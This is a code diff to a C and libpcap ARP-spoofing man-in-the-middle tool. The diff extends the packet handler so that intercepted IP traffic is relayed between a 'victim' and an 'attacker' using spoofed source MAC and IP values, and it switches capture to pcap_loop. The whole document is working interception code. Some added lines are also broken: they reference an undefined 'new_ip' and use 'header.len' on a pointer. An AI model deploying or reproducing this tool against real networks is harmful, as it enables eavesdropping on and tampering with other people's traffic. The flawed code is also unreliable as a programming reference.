@@ -178,7 +178,8 @@ int arp_spoof(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *
 void relayer_got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
 	printf("Sending response from victim to attacker\n");
 											      
-											      
+	u_int8_t *src_mac = r_mac;
+	u_int32_t src_ip = r_ip;			      
 	const struct sniff_ethernet *ethernet;
 	ethernet = strip_ethernet(header, packet);
 	struct ether_header *eptr = (struct ether_header *) packet;
@@ -188,6 +189,21 @@ void relayer_got_packet(u_char *args, const struct pcap_pkthdr *header, const u_
         printf("Ethernet type hex:%x dec:%d is an IP packet\n",
                 ntohs(eptr->ether_type),
                 ntohs(eptr->ether_type));
+		const struct sniff_ip *ip;
+		ip = strip_ip(header, packet);
+		const u_char *payload;
+		u_int32_t payload_s;
+		u_int size_ip = IP_HL(new_ip)*4;
+		printf("Checking ip header length\n");
+		if (size_ip < 20) {
+			printf("   * Invalid IP header length: %u bytes\n", size_ip);
+			return;
+		}
+		const u_char *ip_payload = (u_char *)(packet + SIZE_ETHERNET + size_ip);
+		u_int32_t ip_payload_s = header.len - (SIZE_ETHERNET + size_ip);
+		reflect_ip(src_mac, src_ip, ethernet, ip, ip_payload, ip_payload_s);
+		pcap_breakloop(my_handle);
+		return;
     	}else  if (ntohs (eptr->ether_type) == ETHERTYPE_ARP)
     	{
         printf("Ethernet type hex:%x dec:%d is an ARP packet\n",
@@ -195,8 +211,6 @@ void relayer_got_packet(u_char *args, const struct pcap_pkthdr *header, const u_
                 ntohs(eptr->ether_type));
 		const struct sniff_arp *arp;
 		arp = strip_arp(header, packet);
-		u_int8_t *src_mac = r_mac;
-		u_int32_t src_ip = r_ip;
 		arp_spoof(src_mac, src_ip, ethernet, arp);
 		return;
     	}else {
@@ -358,7 +372,8 @@ void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, 
 	/* Grab a packet */
 	const u_char *packet;		/* The actual packet */
 	my_handle = handle;
-	pcap_dispatch(handle, 1, relayer_got_packet, NULL);
+	//pcap_dispatch(handle, 1, relayer_got_packet, NULL);
+	pcap_loop(handle, 10, relayer_got_packet, NULL);
 	printf("Done waiting for response\n");
 	return;
 	//packet = pcap_next(handle, &header);
